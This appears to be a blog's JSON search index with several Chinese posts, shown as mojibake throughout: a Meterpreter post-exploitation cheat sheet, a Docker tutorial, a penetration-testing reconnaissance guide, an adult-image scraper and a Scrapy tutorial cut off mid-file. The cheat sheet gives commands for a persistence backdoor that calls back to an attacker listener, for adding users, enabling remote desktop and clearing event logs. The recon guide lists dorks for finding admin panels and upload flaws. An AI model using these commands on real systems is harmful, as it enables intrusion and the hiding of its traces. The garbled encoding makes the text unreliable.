-A\nmeterpreteræä¾›ä¸¤ç§æ–¹å¼çš„åé—¨,ä¸€ç§æ˜¯é€šè¿‡æœåŠ¡å¯åŠ¨(metsvc),ä¸€ç§æ˜¯é€šè¿‡å¯åŠ¨é¡¹å¯åŠ¨(persistence).\né€šè¿‡æœåŠ¡(metsvc)å¯åŠ¨æ–¹å¼,ä¼˜ç‚¹æ˜¯å‘½ä»¤ç®€å•æ–¹ä¾¿,ä¸éœ€è¦è®¾ç½®å¤ªå¤šå‚æ•°.ç¼ºç‚¹æ˜¯åªè¦å‘ç°äº†è¿™ä¸ªåé—¨,æ‰€æœ‰äººéƒ½å¯ä»¥è¿æ¥\n\n3.persistence\nrun persistence -S -U -X -i 5 -p ç«¯å£ -r ip\né€šè¿‡å¼€æœºå¯åŠ¨é¡¹å¯åŠ¨çš„æ–¹å¼,ç¼ºç‚¹æ˜¯å‘½ä»¤å‚æ•°å¤šæ¯”è¾ƒå¤æ‚,å¯èƒ½å› ä¸ºå¯åŠ¨é¡¹æƒé™åŸå› ,å¯¼è‡´å¤±è´¥,ä¸”å¹¶æ— å›æ˜¾.ä¼˜ç‚¹æ˜¯,å› ä¸ºè½½å…¥å¯åŠ¨é¡¹ä¸­,æ‰€ä»¥ä¸€èˆ¬çš„æ€è½¯éƒ½ä¼šæ”¾è¡Œ,å¦‚æœåœ¨ç”¨shellcodeåšä¸‹å…æ€ä¼šæ›´å¥½,å½“ç„¶è¿™æ˜¯åè¯\n-A   è‡ªåŠ¨å¯åŠ¨ä¸€ä¸ªåŒ¹é…çš„exploit / multi / handleræ¥è¿æ¥åˆ°ä»£ç†\n-L   å¦‚æœæœªä½¿ç”¨ï¼…TEMPï¼…ï¼Œåˆ™åœ¨ç›®æ ‡ä¸»æœºä¸­å†™å…¥æœ‰æ•ˆè´Ÿè½½çš„ä½ç½®ã€‚\n-P   æœ‰æ•ˆè´Ÿè½½ä½¿ç”¨ï¼Œé»˜è®¤ä¸ºwindows / meterpreter / reverse_tcpã€‚\n-S   ä½œä¸ºæœåŠ¡è‡ªåŠ¨å¯åŠ¨ä»£ç†ç¨‹åºï¼ˆå…·æœ‰SYSTEMæƒé™ï¼‰\n-T   è¦ä½¿ç”¨çš„å¤‡ç”¨å¯æ‰§è¡Œæ¨¡æ¿\n-U   ç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨ä»£ç†\n-X   ç³»ç»Ÿå¼•å¯¼æ—¶è‡ªåŠ¨å¯åŠ¨ä»£ç†ç¨‹åº\n-h   è¿™ä¸ªå¸®åŠ©èœå•\n-i   æ¯æ¬¡è¿æ¥å°è¯•ä¹‹é—´çš„æ—¶é—´é—´éš”ï¼ˆç§’ï¼‰\n-p   è¿è¡ŒMetasploitçš„ç³»ç»Ÿæ­£åœ¨ä¾¦å¬çš„ç«¯å£\n-r   è¿è¡ŒMetasploitç›‘å¬è¿æ¥çš„ç³»ç»Ÿçš„IP\n\n4.run vnc(è¿œç¨‹æ§åˆ¶,ç±»ä¼¼3389è¿œç¨‹æ¡Œé¢)\nrun vnc\n\trun post/windows/manager/enable_rdp\tå¼€å¯è¿œç¨‹æ¡Œé¢\n\n5.getuid(åˆ›å»ºä¸€ä¸ªç”¨æˆ·,å®¢æˆ·ç«¯åŒ–)\nå¸¸ç”¨å‘½ä»¤\nrun getuid -e\t\tå¼€å¯è¿œç¨‹æ¡Œé¢\nrun getuid -u name -p password\t\tæ·»åŠ ç”¨æˆ·\nrun getuid -f\t4446 -e\tå°†3389ç«¯å£è½¬å‘åˆ°4446\n```\n### æ¸…é™¤ç—•è¿¹\næ¸…æ¥šæ‰€æœ‰æ—¥å¿—ä¿¡æ¯\n```bash\nclearev\t\n```\n\n","tags":["kali","æ¸—é€"],"categories":["å·¥å…·ä½¿ç”¨"]},{"title":"dockeråŸºæœ¬ä½¿ç”¨","url":"/2022/04/18/dockeråŸºæœ¬ä½¿ç”¨/","content":"## dockerå¸®åŠ©å‘½ä»¤\n```\ndocker version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯\ndocker help å¸®åŠ©\ndocker info åŸºæœ¬ä¿¡æ¯\n```\n## dockeré•œåƒå‘½ä»¤\n```\ndocker images\n# å¯é€‰é¡¹\n-a, --all   # åˆ—å‡ºæ‰€æœ‰é•œåƒ\n-q, --quite # åªæ˜¾ç¤ºé•œåƒçš„id\n```\n\n#### docker search æœç´¢é•œåƒ\n```\n# å¯é€‰é¡¹\n--filter=STARS=3000 # æœç´¢æ˜Ÿåœ¨3000ä»¥ä¸Šçš„\n```\n\n#### docker pull ä¸‹è½½é•œåƒ\n```\n# ä¸‹è½½é•œåƒ docker pull é•œåƒå tag\n# å¦‚æœä¸å†™tagé»˜è®¤å°±æ˜¯æœ€æ–°ç‰ˆ\n```\n\n#### åˆ é™¤å®¹å™¨\n```\ndocker rm -f id # åˆ é™¤æŒ‡å®šå®¹å™¨\ndocker rm -f $(docker images -qa) # åˆ é™¤æ‰€æœ‰å®¹å™¨\n```\n\n\n\n## dockerå®¹å™¨å‘½ä»¤\n\n**æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨**\n```\n--name = \"åå­—\" # ç»™å®¹å™¨èµ·ä¸€ä¸ªåå­—\n-d            # åå°æ–¹å¼è¿è¡Œ\n-it           # ä½¿ç”¨äº¤äº’å¼æ–¹å¼è¿è¡Œ\n-P            # æŒ‡å®šå®¹å™¨çš„ç«¯å£\n    1.ip:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£\n    2.ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£(å¸¸ç”¨)\n    3.å®¹å™¨ç«¯å£\n-p            # éšæœºç«¯å£\n```\n\n**ä½¿ç”¨**\n```\nchenci@MacBook-Pro ~ %docker run -it centos /bin/bash\n\né€€å‡º\nexit\n```\n\n**æŸ¥çœ‹è¿è¡Œçš„å®¹å™¨**\n```\ndocker ps \n# -a å†å²è¿è¡Œè¿‡çš„å®¹å™¨\n# -n=? æ˜¾ç¤ºæœ€è¿‘åˆ›å»ºçš„å®¹å™¨\n# -q åªæ˜¾ç¤ºå®¹å™¨çš„ç¼–å·\n```\n\n**å¯åŠ¨å’Œåœæ­¢å®¹å™¨**\n```\ndocker start id #å¯åŠ¨å®¹å™¨\ndocker restart id #é‡å¯å®¹å™¨\ndocker stop id #åœæ­¢å½“å‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨\ndocker kill id #å¼ºåˆ¶åœæ­¢å½“å‰å®¹å™¨\n```\n\n**æŸ¥çœ‹æ—¥å¿—**\n```\ndocker logs -tf --tail æ—¥å¿—æ¡æ•° id\n```\n\n**æŸ¥çœ‹é•œåƒå…ƒæ•°æ®**\n```\ndocker inspect id\n```\n\n**è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨**\n```\n# æ–¹æ³•ä¸€\ndocker attach id # è¿›å…¥å®¹å™¨æ­£åœ¨æ‰§è¡Œçš„ç»ˆç«¯\n\n#æ–¹æ³•äºŒ\ndocker exec -it id bashshell #è¿›å…¥å®¹å™¨åå¼€å¯æ–°çš„ç»ˆç«¯\n```\n\n**ä»å®¹å™¨æ‹·è´æ–‡ä»¶åˆ°ä¸»æœº**\n```\ndocker cp id:å®¹å™¨å†…è·¯å¾„ ç›®æ ‡ä¸»æœºè·¯å¾„\n```\n\n## å®ä¾‹-å®‰è£…nginx\n```\n1.æœç´¢é•œåƒ\ndocker search nginx\n\n2.æ‹‰å–é•œåƒ\ndocker pull nginx\n\n3.å¯åŠ¨å¹¶æ˜ å°„åˆ°æœ¬åœ°3344ç«¯å£\ndocker run -d --name nginx01 -p 3344:80 nginx\n\n4.æµ‹è¯•\ncurl localhost:3344\n\n5.è¿›å…¥å®¹å™¨\ndocker exec -it nginx01 /bin/bash\n```\n\n## å®ä¾‹-å®‰è£…tomcat\n```\n1.æ‹‰å–é•œåƒ\nå®˜æ–¹ç‰ˆ\ndocker run -it --rm tomcat:9.0 #æ²¡æœ‰æ­¤é•œåƒå°±ä¼šå»è‡ªåŠ¨ä¸‹è½½,--rmé€€å‡ºåå°±åˆ é™¤é•œåƒ,ä¸€èˆ¬ç”¨äºæµ‹è¯•\n\n1.æ‹‰å–é•œåƒ\ndocker -pull tamcat\n\n2.å¯åŠ¨å¹¶æ˜ å°„\ndocker run -d -p 3355:8080 --name tomcat01 tomcat\n\n3.æµ‹è¯•è®¿é—®,å‘ç°404\ncurl localhost:3355\n\n4.è¿›å…¥å®¹å™¨\ndocker exec -it tomcat01 /bin/bash\n\n5.æ‹·è´\ncp -r webapps.dist/* webapps/\n```\n\n\n## commité•œåƒ\n```shell\ndocker commit æäº¤å®¹å™¨æˆä¸ºä¸€ä¸ªæ–°çš„å‰¯æœ¬\n\n#ä¸gitç›¸ä¼¼\ndocker commit -m='æäº¤çš„æè¿°ä¿¡æ¯' -a='ä½œè€…' å®¹å™¨id ç›®æ ‡é•œåƒå:[tag]\n\n#1.åˆ©ç”¨åŸæ¥çš„tomcatåˆ¶ä½œä¸€ä¸ªæ–°é•œåƒ\ndocker commit -a='chenci' -m='add webapps' id tomcat02:1.0\n\n```\n\n## å®¹å™¨æ•°æ®å·\n```shell\nä¸ºäº†å®¹å™¨çš„æŒä¹…åŒ–å’ŒåŒæ­¥æ“ä½œ\n```\n**ä½¿ç”¨æ•°æ®å·**\n```shell\næŒ‚è½½\ndocker run -it -v ä¸»æœºç›®å½•:å®¹å™¨ç›®å½•\n```\n**æµ‹è¯•åŒæ­¥mysql**\n```shell\n#1.å¯åŠ¨å¹¶æ˜ å°„ç«¯å£,è®¾ç½®å¯†ç \ndocker run -d -p 3310:3306 -v /Users/chenci/guazai/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name some-mysql mysql:5.7\n\n#2.è¿œç¨‹è¿æ¥\nmysql -uroot -p123456 -h 10.30.3.100 -P 3310\n\n#3.åœ¨è¿œç¨‹è¿æ¥ä¸­åˆ›å»ºæ•°æ®åº“æµ‹è¯•\næµ‹è¯•æ— è¯¯,æœ¬åœ°å’Œå®¹å™¨ä¸­éƒ½ä¼šå¤šä¸€ä¸ªæµ‹è¯•æ•°æ®åº“\n```\n**å…·åå’ŒåŒ¿åæŒ‚è½½**\n```shell\n#åªå†™äº†å®¹å™¨å†…çš„è·¯å¾„,å°±æ˜¯åŒ¿åæŒ‚è½½\ndocker run -it -P --name nginx -V /path id\n#æŸ¥çœ‹\nlocal     6c71f963cc89b24d16b4b47cb35df42445ff9d9395753b192ba72cbbbc22d583\n\n\n#å†™äº†åå­—å°±æ˜¯å…·åæŒ‚è½½\ndocker run -it -P --name nginx -V juming /path id\n#æŸ¥çœ‹\nlocal     juming\n\n\n#æŸ¥çœ‹æ‰€æœ‰çš„volume\ndocker volume ls\n\n#æŸ¥çœ‹å·\ndocker volume inspect juming\n\n```\n**`é€šè¿‡å…·åå¯ä»¥æ–¹ä¾¿æ‰¾åˆ°ä¸€ä¸ªå·é€šæ‰€ä»¥ä¸€èˆ¬ä½¿ç”¨å…·åæŒ‚è½½`**\n```shell\n-v å®¹å™¨å†…è·¯å¾„ #åŒ¿åæŒ‚è½½\n-v å·å:å®¹å™¨å†…è·¯å¾„ #åŒ¿åæŒ‚è½½\n```\n**`æ‰©å±•`**\n```shell\n#åœ¨è·¯å¾„åé¢è·Ÿ:roæˆ–åˆ™rw\nroè¡¨ç¤ºè¿™ä¸ªè·¯å¾„åªèƒ½é€šè¿‡å®¿ä¸»æœºæ¥æ“ä½œ,å®¹å™¨å†…éƒ¨æ— æ³•æ“ä½œ\n```\n\n","tags":["æ•™ç¨‹","docker"],"categories":["å·¥å…·ä½¿ç”¨"]},{"title":"ä¿¡æ¯æ”¶é›†","url":"/2022/04/17/ä¿¡æ¯æ”¶é›†/","content":"\n# ä¿¡æ¯æ”¶é›†æµç¨‹æ¡†æ¶\n    webå®‰å…¨çš„æœ¬è´¨æ˜¯ä¿¡æ¯æ”¶é›†,ä¿¡æ¯æ”¶é›†çš„å¹¿åº¦å†³å®šäº†æ¸—é€æµ‹è¯•çš„æ·±åº¦\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151406722.png?token=ARYCSAQD6OKJD27QWBHELEDCQCML2)\n\n# google hacking\nåˆ©ç”¨è°·æ­Œå¼ºå¤§çš„æœç´¢å¼•æ“,ç»å¸¸ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„çš„æ”¶è·\n\n## åŸºæœ¬çš„æœç´¢\n- é€»è¾‘ä¸ and\n- é€»è¾‘æˆ– or\n- é€»è¾‘é \n- é€šé…ç¬¦ *\n\n## åº”ç”¨\nintextå¯»æ‰¾ç½‘é¡µæ­£æ–‡ä¸­çš„å…³é”®å­—,å¦‚: intextåå°ç™»å½•\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407831.png?token=ARYCSAWV4LKDZRPCSEVF6JTCQCMMU)\n\nintitleå¯»æ‰¾ç½‘é¡µæ ‡é¢˜ä¸­çš„å…³é”®å­—,å¦‚: intitle\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407472.png?token=ARYCSARBOVPDEZB5OZMIVK3CQCMNG)\n\nallintitleç”¨æ³•å’Œintitleå·®ä¸å¤š,å·®åˆ«åœ¨äºå¯æŒ‡å®šå¤šä¸ªå…³é”®å­—\ninurlè¿”å›urlä¸­å«æœ‰å…³é”®å­—çš„ç½‘é¡µ,å¦‚: inurl:login\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407166.png?token=ARYCSAQ3SFZMMU3UYVUJCGLCQCMOQ)\n\næŸ¥æ‰¾ç®¡ç†å‘˜ç™»å½•ç•Œé¢\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151407174.png?token=ARYCSAQOLC655DBNNP7VXPLCQCMPK)\n\n\næŸ¥æ‰¾phpmyadmin\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151408516.png?token=ARYCSASH2YTTZCBNY6FPUJDCQCMQG)\n\nallinurlå’Œinurlçš„ç”¨æ³•å·®ä¸å¤š,å·®åˆ«åœ¨äºå¯æŒ‡å®šå¤šä¸ªå…³é”®å­—\nsiteæŒ‡å®šè®¿é—®çš„ç½‘ç«™,å¦‚,site:baidu.com inurl:login\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151408454.png?token=ARYCSARRLHPP2UJ4SQO2VWLCQCMQY)\n\n## æŸ¥æ‰¾ç½‘ç«™åå°\n\n- site:xx.com intext:ç®¡ç†\n- site:xx.com inurl:login\n- site:xx.com intitle:åå°\n\n## æŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„ç¨‹åº\n\n- site:xx.com filetype:asp\n- site:xx.com filetype:php\n- site:xx.com filetype:jsp\n- site:xx.com filetype:aspx\n\n## æŸ¥çœ‹ä¸Šä¼ æ¼æ´\n- site:xx.com inurl:file\n- site:xx.com inurl:load\n\n# dnsåŸŸåä¿¡æ¯\né¦–å…ˆæ˜¯å¯¹åº”åŸŸåçš„ip,åŸŸåæ³¨å†Œäºº,é‚®ç®±,dns,å­åŸŸåä¹‹ç±»çš„ä¿¡æ¯\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151408552.png?token=ARYCSAXOYDDMLZE6YSW4UZLCQCMRI)\n\n## whoisæŸ¥è¯¢\n- ç„¶ååˆ¤æ–­æ˜¯å¦æœ‰cdn\thttp://cdn.chinaz.com\n- ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸åŒåœ°åŒºçš„ç”µè„‘ping,çœ‹ipæ˜¯å¦æ˜¯åŒä¸€ä¸ª\n- å¦‚æœæŸ¥è¯¢å‡ºçš„ipæœ‰å¤šä¸ªå°±è¯´æ˜ä½¿ç”¨äº†cdn\n\n## CDNæŸ¥è¯¢\n- ç»•è¿‡cdnæŸ¥è¯¢çœŸå®ip https://x.threatbook.cn/ å¾®æ­¥\n\n# æ•´ç«™åˆ†æ\næœåŠ¡å™¨ç±»å‹\n- æœåŠ¡å™¨å¹³å°,ç‰ˆæœ¬ç­‰\nç½‘ç«™å®¹å™¨\n- æ­å»ºç½‘ç«™çš„æœåŠ¡ç»„ä»¶,å¦‚:iis,apache,nginxç­‰ç­‰\nè„šæœ¬ç±»å‹\n- å¸¸è§çš„æœ‰asp,php,jsp,aspx\næ•°æ®åº“ç±»å‹\n- å¸¸è§çš„æœ‰access,sqlserver,mysql,oracle\ncmsç±»å‹\n- ç½‘ç«™æ¨¡æ¿\nwaf\n- å®‰å…¨é˜²æŠ¤è½¯ä»¶\n\n## æœåŠ¡å™¨ç±»å‹(windows/linux)\n- nmap æ‰«æ\n- googleæŠ“åŒ…åˆ†æ\n\n## ç½‘ç«™å®¹å™¨(iis,apache,nginx)\nçŸ¥é“ç½‘ç«™å®¹å™¨å¾ˆé‡è¦,å¦‚iis6.0çš„è§£ææ¼æ´,ngixn<0.83çš„è§£ææ¼æ´.,iis7.0çš„ç•¸å½¢è§£ææ¼æ´ç­‰ç­‰\n- nmap æ‰«æ\n- googleæŠ“åŒ…åˆ†æ\n\n## è„šæœ¬ç±»å‹(php,jsp,asp,aspxç­‰)\n- æ ¹æ®ç½‘ç«™çš„url\n- ç›´æ¥æ‰“å¼€ä¸€ä¸ªå±•ç¤ºé¡µé¢æŸ¥çœ‹\n- æ ¹æ®firefoxçš„æ’ä»¶æŸ¥çœ‹\n\n## æ•°æ®åº“ç±»å‹\n- mysqlç«¯å£ä¸º3389,æ•°æ®åº“åç¼€å.sql\n- sqlserverç«¯å£ä¸º1433,æ•°æ®åº“åç¼€å.mdf\n- accessåç¼€åä¸º.mdb\n- oraacle,ç«¯å£ä¸º1521\n\nä¸€èˆ¬çš„å¸¸è§æ­é…ä¸º\n\n- ASPå’ŒASPX:access,sqlserver\n- PHP:mysql\n- JSP:oracle,mysql\n\n## ç«¯å£æ‰«æ\næ‰«æç›®æ ‡å¼€æ”¾äº†å“ªäº›ç«¯å£,å¦‚å¸¸è§çš„135,137,445ç»å¸¸çˆ†å‘å‡ºæ¼æ´\n- 21,22,23,3389\tftp,ssh,telnet,windowsè¿œç¨‹æ¡Œé¢\n- 873 rsync æœªæˆæƒè®¿é—®æ¼æ´\n- 3306 mysql å¼±å£ä»¤\n- 6379 redisæœªæˆæƒè®¿é—®æ¼æ´\n\n## ç½‘ç«™æ•æ„Ÿç›®å½•å’Œæ–‡ä»¶\n- åå°ç›®å½•:ä¸‡èƒ½å¯†ç ,å¼±å£ä»¤,çˆ†ç ´\n- å®‰è£…åŒ…:è·å–æ•°æ®åº“ä¿¡æ¯,ç”šè‡³æ˜¯ç½‘ç«™æºç \n- ä¸Šä¼ ç›®å½•:ä¸Šä¼ æœ¨é©¬,ä¸€å¥è¯ç­‰\n- mysqlç®¡ç†æ¥å£:çˆ†ç ´,å¼±å£ä»¤,ä¸‡èƒ½å¯†ç ,ç”šè‡³èƒ½ç›´æ¥æ‹¿shell\n- phpinfo:æš´éœ²å„ç§é…ç½®ä¿¡æ¯\n- ç¼–è¾‘å™¨:å„ç§ç•¸å½¢æ¼æ´\n- robots.txt\n\n## æ—ç«™å’ŒCæ®µ\n- æ—ç«™æŒ‡çš„æ˜¯åŒä¸€æœåŠ¡å™¨ä¸Šå¾—ä¸åŒç½‘ç«™,å¦‚æœä½ æ‹¿ä¸ä¸‹è¿™ä¸ªç½‘ç«™,ä¸å¦‚è¯•è¯•æ—ç«™.æ‹¿ä¸‹æ—ç«™webshell,å†ææƒä¹Ÿå°±æ‹¿ä¸‹äº†è¿™ä¸ªç½‘ç«™äº†\n\n- Cæ®µæŒ‡çš„æ˜¯åŒä¸€ç½‘æ®µçš„å…¶ä»–æœåŠ¡å™¨,192.168.0.1,0å°±æ˜¯Cæ®µ.å¦‚æœæ‹¿ä¸‹äº†Cæ®µä¸­ä¸€å°æœåŠ¡å™¨,å°±å¯ä½¿ç”¨å—…æ¢å·¥å…·,arpæ¬ºéª—ç­‰åŠ«æŒæµé‡,æ‰¾åˆ°å…³é”®ä¿¡æ¯,æ‹¿ä¸‹æœåŠ¡å™¨\n\n- æ—ç«™æŸ¥è¯¢:http://s.tool.chinaz.com/same\n\n- Cæ®µæŸ¥è¯¢:http://www.webscan.cc/\n\n","tags":["webå®‰å…¨","ä¿¡æ¯æ”¶é›†"],"categories":["ç¬”è®°"]},{"title":"å¼‚æ­¥åç¨‹çˆ¬å–ç¦åˆ©å§¬","url":"/2022/04/14/å¼‚æ­¥çˆ¬å–æŸæ¶©æƒ…ç½‘ç«™å›¾ç‰‡/","content":"\n\n```python\n# -*- coding: utf-8 -*-\n\"\"\"\n-------------------------------------------------\n   File Nameï¼š     åç¨‹4-å®æˆ˜çˆ¬å–tuao8.com\n   Author :       chenci\n   dateï¼š          2022/3/25\n-------------------------------------------------\n\"\"\"\nimport aiofiles\nimport requests\nfrom lxml import etree\nimport asyncio\nimport aiohttp\nfrom fake_useragent import UserAgent\nimport os\nimport time\n\ndef create_dir_not_exist(path):\n    if not os.path.exists(path):\n        os.makedirs(path)\n\n\n# æŠ“å–æ¯ä¸ªæ¡ç›®çš„å›¾é›†\ndef get_photos_url():\n    resp = requests.get(url='https://www.tuao8.xyz/category-2_1.html', headers=header)\n    text = etree.HTML(resp.text)\n    href_url_list = text.xpath('//*[@id=\"container\"]/main/article/div/a/@href')\n    return href_url_list\n\n\n# å»è¯·æ±‚æ¯ä¸ªå›¾é›†.è¿”å›æºç \nasync def get_photos(photo_list):\n    # é™åˆ¶å¹¶å‘ç†Ÿè·¯é»˜è®¤100,0ä¸ºæ— é™åˆ¶\n    conn = aiohttp.TCPConnector(limit=10)\n    # å‘é€è¯·æ±‚\n    async with aiohttp.ClientSession(connector=conn) as session:\n        async with await session.get(url=photo_list, headers=header) as resp:\n            page_text = await resp.text()\n            await get_photos_title_page(page_text, photo_list)\n\n\n# ä»æ¯ä¸ªæºç é‡Œç­›é€‰å‡ºæ ‡é¢˜å’Œæœ€å¤§é¡µç ,url\nasync def get_photos_title_page(text, url):\n    tasks = []\n    html = etree.HTML(text)\n    title = html.xpath('//*[@id=\"container\"]/main/article/h1/text()')[0]\n    max_page = int(html.xpath('//*[@id=\"dm-fy\"]/li[last()-1]/a/text()')[0])\n    create_dir_not_exist(f'./imgs/tuzo_xc/{title}')\n    task = asyncio.create_task(get_download_url(url=url, title=title, max_page=max_page))\n    tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# è·å–æ¯ä¸€é¡µçš„urlå¹¶ä»æºç ä¸­ç­›é€‰å‡ºæ¯å¼ å›¾ç‰‡çš„ä¸‹è½½é“¾æ¥\nasync def get_download_url(url, title, max_page):\n    tasks = []\n    for i in range(1, max_page):\n        urls = f'{url}?page={i}'\n        conn = aiohttp.TCPConnector(limit=10)\n        async with aiohttp.ClientSession(connector=conn) as session:\n            async with await session.get(url=urls, headers=header) as resp:\n                page_text = await resp.text()\n                html = etree.HTML(page_text)\n                image_url = html.xpath('//*[@class=\"entry\"]//img/@src')[0]\n                task = asyncio.create_task(download_image(image_url, title, i))\n                tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# ä¸‹è½½\nasync def download_image(image_url, title, i):\n    conn = aiohttp.TCPConnector(limit=30)\n    async with aiohttp.ClientSession(connector=conn) as session:\n        try:\n            async with await session.get(url=image_url, headers=header) as resp:\n                print(image_url)\n                async with aiofiles.open(f'./imgs/{title}/{i}.jpg', 'wb') as f:\n                    print(f'æ­£åœ¨ä¸‹è½½{title}  ç¬¬{i}å¼ ')\n                    await f.write(await resp.read())\n        except:\n            pass\n        print('ä¸‹è½½å®Œæˆ')\n\n\nasync def main():\n    href_url_list = get_photos_url()\n    tasks = []\n    for url in href_url_list:\n        task = asyncio.create_task(get_photos(photo_list=url))\n        tasks.append(task)\n    await asyncio.wait(tasks)\n\n\nif __name__ == '__main__':\n    start = time.time()\n    ua = UserAgent()\n    header = {\n        'Referer': 'https://www.tuao8.xyz/category-2_2.html',\n        'user-agent': ua.random\n    }\n    asyncio.run(main())\n    end = time.time()\n    print('å…¨éƒ¨ä¸‹è½½å®Œæˆ!è€—æ—¶:', int(end - start), 'ç§’')\n\n\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151424766.png?token=ARYCSASWHOWU3BBPK4JWMATCQCOMA)\n","tags":["requests","å¼‚æ­¥"],"categories":["çˆ¬è™«"]},{"title":"scrapyæ¡†æ¶å­¦ä¹ ","url":"/2022/04/08/scrapyæ¡†æ¶å­¦ä¹ /","content":"\n## åˆ›å»ºé¡¹ç›®\n\n```bash\nscrapy startproject tutorial\n```\n\n## åˆ›å»ºä»»åŠ¡\n\n```bash\nscrapy genspider first www.baidu.com\n```\n\nä¼šç”Ÿæˆä¸€ä¸ªfirstæ–‡ä»¶\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    # å”¯ä¸€æ ‡è¯†ç¬¦\n    name = 'first'\n    # å…è®¸çš„åŸŸå\n    allowed_domains = ['www.baidu.com']\n    # èµ·å§‹çš„url,é»˜è®¤å‘é€getè¯·æ±‚\n    start_urls = ['https://www.baidu.com/']\n\n    # æ•°æ®è§£æ\n    def parse(self, response):\n        pass\n```\n\n## ä¿®æ”¹é…ç½®æ–‡ä»¶\n\nåªè¾“å‡ºERRORçº§åˆ«çš„æ—¥å¿—\n\n```python\n# åªè¾“å‡ºERRORçº§åˆ«çš„æ—¥å¿—\nLOG_LEVEL = 'ERROR'\n```\n\nä¸éµä»robotsåè®®\n\n```python\nROBOTSTXT_OBEY = False  \n```\n\næŒ‡å®šua\n\n```python\nUSER_AGENT = 'tutorial (+http://www.yourdomain.com)'\n```\n\n## è¿è¡Œç¨‹åº\n\n```bash\nscrapy crawl first\n```\n\nä¼šè¾“å‡ºä¸€ä¸ªresponseå¯¹è±¡\n\n```\n<200 https://www.baidu.com/>\n```\n\n## æ•°æ®è§£æ\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # è¿”å›ä¸€ä¸ªselectorå¯¹è±¡\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            print(title)\n\n```\n\nå¯ä»¥çœ‹åˆ°è¿”å›äº†ä¸€ä¸ªselectorå¯¹è±¡,æˆ‘ä»¬æƒ³è¦çš„æ•°æ®åœ¨dataå±æ€§é‡Œ\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='å¦‚æœä½ å¾—ç½ªäº†è€æ¿ï¼Œå¤±å»çš„åªæ˜¯ä¸€ä»½å·¥ä½œï¼›å¦‚æœä½ å¾—ç½ªäº†å®¢æˆ·ï¼Œå¤±å»çš„ä¸è¿‡æ˜¯ä¸€ä»½è®¢...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='æœ‰ä½éå¸¸æ¼‚äº®çš„å¥³åŒäº‹ï¼Œæœ‰å¤©èµ·æ™šäº†æ²¡æœ‰æ—¶é—´åŒ–å¦†ä¾¿æ€¥å¿™å†²åˆ°å…¬å¸ã€‚ç»“æœé‚£å¤©å¥¹è¢«è®°...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='æ‚Ÿç©ºå’Œå”åƒ§ä¸€èµ·ä¸ŠæŸå«è§†éè¯šå‹¿æ‰°,æ‚Ÿç©ºä¸Šå°,24ç›ç¯å…¨ç­ã€‚ç†ç”±:1.æ²¡æˆ¿æ²¡è½¦...'>\n```\n\nä»dataå±æ€§ä¸­å–å‡ºæˆ‘ä»¬æƒ³è¦çš„æ•°æ®\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # è¿”å›ä¸€ä¸ªselectorå¯¹è±¡\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # å–å‡ºæ•°æ®\n            title = title.extract()  # extract_first()å–ç¬¬ä¸€ä¸ª\n            print(title)\n\n```\n\n## æŒä¹…åŒ–å­˜å‚¨\n\n### 1.åŸºäºç»ˆç«¯æŒ‡ä»¤çš„å­˜å‚¨\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        data_all = []\n        # è¿”å›ä¸€ä¸ªselectorå¯¹è±¡\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # å–å‡ºæ•°æ®\n            title = title.extract()  # extract_first()å–ç¬¬ä¸€ä¸ª\n            # æ„é€ å­—å…¸\n            dic = {\n                'title': title\n            }\n            data_all.append(dic)\n        # è¿”å›ä¸€ä¸ªåˆ—è¡¨\n        return data_all\n```\n\næ‰§è¡Œ\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first -o test.csv\n```\n\n### 2.åŸºäºç®¡é“çš„æŒä¹…åŒ–å­˜å‚¨\n\nå¼€å¯ç®¡é“\n\nsettings.py\n\n```python\nITEM_PIPELINES = {\n    'tutorial.pipelines.TutorialPipeline': 300,  # 300è¡¨ç¤ºä¼˜å…ˆçº§,è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜\n}\n```\n\nåœ¨items.pyä¸­å®šä¹‰ç›¸å…³å±æ€§\n\n```python\nimport scrapy\n\n\nclass TutorialItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    # Fieldå®šä¹‰å¥½çš„å±æ€§å½“åšä¸‡èƒ½å±æ€§\n    title = 